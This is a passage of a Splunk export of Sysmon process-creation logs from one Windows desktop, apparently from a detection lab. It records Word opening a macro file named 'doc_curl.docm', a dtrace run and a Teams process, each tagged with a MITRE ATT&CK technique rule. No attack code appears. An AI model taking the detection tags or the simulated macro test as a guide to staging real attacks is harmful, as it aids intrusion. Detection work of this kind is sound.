Execution","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:41:56.542","_raw":"02/21/2021 11:41:56 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96108\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2021-02-21 19:41:56.542\r\nProcessGuid: {f589267d-b784-6032-0d17-000000002a00}\r\nProcessId: 2344\r\nImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\r\nFileVersion: 16.0.13801.20160\r\nDescription: Microsoft Word\r\nProduct: Microsoft Office\r\nCompany: Microsoft Corporation\r\nOriginalFileName: WinWord.exe\r\nCommandLine: \"C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\SLitt\\Desktop\\docs\\doc_curl.docm\" /o \"\"\r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\docs\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=34FEDBE8BC105D887CD0A9806F22DA00B0D3A126,MD5=581D3C8191F703E7A10D833E5E11E42A,SHA256=7B365B3870A63AE247D22F599F178636F808388C4E43E2A3426545A86406C76D,IMPHASH=7F3EEE6930E62160D8989EDC51550522\r\nParentProcessGuid: {f589267d-9e74-6032-8100-000000002a00}\r\nParentProcessId: 5560\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE","_time":"2021-02-21T11:41:56.000-0800","date_hour":"11","date_mday":"21","date_minute":"41","date_month":"february","date_second":"56","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=,=_\\r:_--_","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"result":{"CommandLine":"dtrace  -Fn \"tick-20sec {exit(0);} syscall:::entry {@[probefunc, execname, pid] = count();}\"","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\Desktop\\","Description":"DTrace/NT","EventCode":"1","EventType":"4","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Hashes":"SHA1=AB74FBAD656D45DE4411F0C48A0D12E02BF41586,MD5=FEDCA28AD0D2F057E229148218952A99,SHA256=0806EF4688C84A6066DA178563821F65C5F7464E024699DE3A0FE10C4152174E,IMPHASH=358351A0CEEDCB85263153101DBDA364","Image":"C:\\Program Files\\DTrace\\dtrace.exe","IntegrityLevel":"High","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-1d05-030000000000}","LogonId":"0x3051D","Message":"Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:41:54.453\r\nProcessGuid: {f589267d-b782-6032-0817-000000002a00}\r\nProcessId: 6772\r\nImage: C:\\Program Files\\DTrace\\dtrace.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: DTrace/NT\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: dtrace.exe\r\nCommandLine: dtrace  -Fn \"tick-20sec {exit(0);} syscall:::entry {@[probefunc, execname, pid] = count();}\" \r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-1d05-030000000000}\r\nLogonId: 0x3051D\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=AB74FBAD656D45DE4411F0C48A0D12E02BF41586,MD5=FEDCA28AD0D2F057E229148218952A99,SHA256=0806EF4688C84A6066DA178563821F65C5F7464E024699DE3A0FE10C4152174E,IMPHASH=358351A0CEEDCB85263153101DBDA364\r\nParentProcessGuid: {f589267d-9f94-6032-7002-000000002a00}\r\nParentProcessId: 4844\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\"","OpCode":"Info","OriginalFileName":"dtrace.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\"","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentProcessGuid":"{f589267d-9f94-6032-7002-000000002a00}","ParentProcessId":"4844","ProcessGuid":"{f589267d-b782-6032-0817-000000002a00}","ProcessId":"6772","Product":"Microsoft® Windows® Operating System","RecordNumber":"96107","RuleName":"technique_id=T1059.003,technique_name=Windows Command Shell","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:41:54.453","_raw":"02/21/2021 11:41:54 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96107\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2021-02-21 19:41:54.453\r\nProcessGuid: {f589267d-b782-6032-0817-000000002a00}\r\nProcessId: 6772\r\nImage: C:\\Program Files\\DTrace\\dtrace.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: DTrace/NT\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: dtrace.exe\r\nCommandLine: dtrace  -Fn \"tick-20sec {exit(0);} syscall:::entry {@[probefunc, execname, pid] = count();}\" \r\nCurrentDirectory: C:\\Users\\SLitt\\Desktop\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-1d05-030000000000}\r\nLogonId: 0x3051D\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=AB74FBAD656D45DE4411F0C48A0D12E02BF41586,MD5=FEDCA28AD0D2F057E229148218952A99,SHA256=0806EF4688C84A6066DA178563821F65C5F7464E024699DE3A0FE10C4152174E,IMPHASH=358351A0CEEDCB85263153101DBDA364\r\nParentProcessGuid: {f589267d-9f94-6032-7002-000000002a00}\r\nParentProcessId: 4844\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\"","_time":"2021-02-21T11:41:54.000-0800","date_hour":"11","date_mday":"21","date_minute":"41","date_month":"february","date_second":"54","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=.,=__\\r:_-","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
{"preview":true,"lastrow":true,"result":{"CommandLine":"\"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --type=renderer --autoplay-policy=no-user-gesture-required --disable-background-timer-throttling --field-trial-handle=1532,1956434419288104223,12005084433099803542,131072 --enable-features=WebComponentsV0Enabled --disable-features=PictureInPicture,SpareRendererForSitePerProcess --disable-gpu-compositing --lang=en-US --enable-wer --app-user-model-id=com.squirrel.Teams.Teams --app-path=\"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\resources\\app.asar\" --electron-shared-settings=eyJjci5jb21wYW55IjoiRWxlY3Ryb24iLCJjci5kdW1wcyI6IiIsImNyLmVuYWJsZWQiOmZhbHNlLCJjci5wcm9kdWN0IjoiRWxlY3Ryb24iLCJjci5zZXNzaW9uIjoiIiwiY3IudXJsIjoiIiwiY3IudmVyc2lvbiI6IiJ9 --device-scale-factor=1 --num-raster-threads=3 --enable-main-frame-before-activation --renderer-client-id=49 --no-v8-untrusted-code-mitigations --mojo-platform-channel-handle=4284 /prefetch:1","Company":"Microsoft Corporation","ComputerName":"DESKTOP-3U2S6EJ","CurrentDirectory":"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\","Description":"Microsoft Teams","EventCode":"1","EventType":"4","FileVersion":"1.4.00.2879","Hashes":"SHA1=F7A66CB007953E67442C9A473F772D210E4539AC,MD5=0AF216F9DC9F5E899A0B56F650A1E4EF,SHA256=B3AF485CC7B02A60C9422EAEC23821F1C92CA15221153CD32F63E8244AE38006,IMPHASH=B64D42F34FD355F7B22A35E8F64CC156","Image":"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe","IntegrityLevel":"Low","Keywords":"None","LogName":"Microsoft-Windows-Sysmon/Operational","LogonGuid":"{f589267d-9e72-6032-3707-030000000000}","LogonId":"0x30737","Message":"Process Create:\r\nRuleName: technique_id=T1036,technique_name=Masquerading\r\nUtcTime: 2021-02-21 19:41:47.078\r\nProcessGuid: {f589267d-b77b-6032-fe16-000000002a00}\r\nProcessId: 4392\r\nImage: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\r\nFileVersion: 1.4.00.2879\r\nDescription: Microsoft Teams\r\nProduct: Microsoft Teams\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Teams.exe\r\nCommandLine: \"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --type=renderer --autoplay-policy=no-user-gesture-required --disable-background-timer-throttling --field-trial-handle=1532,1956434419288104223,12005084433099803542,131072 --enable-features=WebComponentsV0Enabled --disable-features=PictureInPicture,SpareRendererForSitePerProcess --disable-gpu-compositing --lang=en-US --enable-wer --app-user-model-id=com.squirrel.Teams.Teams --app-path=\"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\resources\\app.asar\" --electron-shared-settings=eyJjci5jb21wYW55IjoiRWxlY3Ryb24iLCJjci5kdW1wcyI6IiIsImNyLmVuYWJsZWQiOmZhbHNlLCJjci5wcm9kdWN0IjoiRWxlY3Ryb24iLCJjci5zZXNzaW9uIjoiIiwiY3IudXJsIjoiIiwiY3IudmVyc2lvbiI6IiJ9 --device-scale-factor=1 --num-raster-threads=3 --enable-main-frame-before-activation --renderer-client-id=49 --no-v8-untrusted-code-mitigations --mojo-platform-channel-handle=4284 /prefetch:1\r\nCurrentDirectory: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Low\r\nHashes: SHA1=F7A66CB007953E67442C9A473F772D210E4539AC,MD5=0AF216F9DC9F5E899A0B56F650A1E4EF,SHA256=B3AF485CC7B02A60C9422EAEC23821F1C92CA15221153CD32F63E8244AE38006,IMPHASH=B64D42F34FD355F7B22A35E8F64CC156\r\nParentProcessGuid: {f589267d-9e99-6032-0601-000000002a00}\r\nParentProcessId: 8936\r\nParentImage: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\r\nParentCommandLine: \"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --system-initiated","OpCode":"Info","OriginalFileName":"Teams.exe","ParentCommandLine":"\"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --system-initiated","ParentImage":"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe","ParentProcessGuid":"{f589267d-9e99-6032-0601-000000002a00}","ParentProcessId":"8936","ProcessGuid":"{f589267d-b77b-6032-fe16-000000002a00}","ProcessId":"4392","Product":"Microsoft Teams","RecordNumber":"96102","RuleName":"technique_id=T1036,technique_name=Masquerading","Sid":"S-1-5-18","SidType":"0","SourceName":"Microsoft-Windows-Sysmon","TaskCategory":"Process Create (rule: ProcessCreate)","TerminalSessionId":"1","Type":"Information","User":["NOT_TRANSLATED","DESKTOP-3U2S6EJ\\SLitt"],"UtcTime":"2021-02-21 19:41:47.078","_raw":"02/21/2021 11:41:47 AM\nLogName=Microsoft-Windows-Sysmon/Operational\nEventCode=1\nEventType=4\nComputerName=DESKTOP-3U2S6EJ\nUser=NOT_TRANSLATED\nSid=S-1-5-18\nSidType=0\nSourceName=Microsoft-Windows-Sysmon\nType=Information\nRecordNumber=96102\nKeywords=None\nTaskCategory=Process Create (rule: ProcessCreate)\nOpCode=Info\nMessage=Process Create:\r\nRuleName: technique_id=T1036,technique_name=Masquerading\r\nUtcTime: 2021-02-21 19:41:47.078\r\nProcessGuid: {f589267d-b77b-6032-fe16-000000002a00}\r\nProcessId: 4392\r\nImage: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\r\nFileVersion: 1.4.00.2879\r\nDescription: Microsoft Teams\r\nProduct: Microsoft Teams\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Teams.exe\r\nCommandLine: \"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --type=renderer --autoplay-policy=no-user-gesture-required --disable-background-timer-throttling --field-trial-handle=1532,1956434419288104223,12005084433099803542,131072 --enable-features=WebComponentsV0Enabled --disable-features=PictureInPicture,SpareRendererForSitePerProcess --disable-gpu-compositing --lang=en-US --enable-wer --app-user-model-id=com.squirrel.Teams.Teams --app-path=\"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\resources\\app.asar\" --electron-shared-settings=eyJjci5jb21wYW55IjoiRWxlY3Ryb24iLCJjci5kdW1wcyI6IiIsImNyLmVuYWJsZWQiOmZhbHNlLCJjci5wcm9kdWN0IjoiRWxlY3Ryb24iLCJjci5zZXNzaW9uIjoiIiwiY3IudXJsIjoiIiwiY3IudmVyc2lvbiI6IiJ9 --device-scale-factor=1 --num-raster-threads=3 --enable-main-frame-before-activation --renderer-client-id=49 --no-v8-untrusted-code-mitigations --mojo-platform-channel-handle=4284 /prefetch:1\r\nCurrentDirectory: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\\r\nUser: DESKTOP-3U2S6EJ\\SLitt\r\nLogonGuid: {f589267d-9e72-6032-3707-030000000000}\r\nLogonId: 0x30737\r\nTerminalSessionId: 1\r\nIntegrityLevel: Low\r\nHashes: SHA1=F7A66CB007953E67442C9A473F772D210E4539AC,MD5=0AF216F9DC9F5E899A0B56F650A1E4EF,SHA256=B3AF485CC7B02A60C9422EAEC23821F1C92CA15221153CD32F63E8244AE38006,IMPHASH=B64D42F34FD355F7B22A35E8F64CC156\r\nParentProcessGuid: {f589267d-9e99-6032-0601-000000002a00}\r\nParentProcessId: 8936\r\nParentImage: C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\r\nParentCommandLine: \"C:\\Users\\SLitt\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\" --system-initiated","_time":"2021-02-21T11:41:47.000-0800","date_hour":"11","date_mday":"21","date_minute":"41","date_month":"february","date_second":"47","date_wday":"sunday","date_year":"2021","date_zone":"local","host":"DESKTOP-3U2S6EJ","index":"main","linecount":"37","punct":"//_::_=--/===-==---==--====__(:_)==_:\\r:_=,=\\r:_--_:","source":"WinEventLog:Microsoft-Windows-Sysmon/Operational","sourcetype":"WinEventLog:Microsoft-Windows-Sysmon/Operational","splunk_server":"DESKTOP-3U2S6EJ","timeendpos":"23","timestartpos":"0"}}
